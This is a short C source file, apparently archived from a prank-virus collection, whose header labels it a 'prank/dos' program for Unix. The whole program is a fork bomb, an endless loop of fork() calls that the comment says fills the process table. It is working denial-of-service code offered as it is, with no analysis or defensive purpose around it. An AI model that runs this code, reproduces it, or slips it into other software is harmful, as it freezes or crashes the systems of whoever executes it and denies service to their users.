/*
  name      Consecutive Normal Punch
  type      prank/dos
  cve       —
  year      —
  os        unix
  authors   Minhas Kamal
  source    https://github.com/MinhasKamal/CuteVirusCollection
  archived  krisyotam
  notes     C fork bomb; infinite fork() loop
 */

// Unix fork bomb — creates child processes until the process table fills.
#include <unistd.h>

int main(){
    while(1) fork();
}
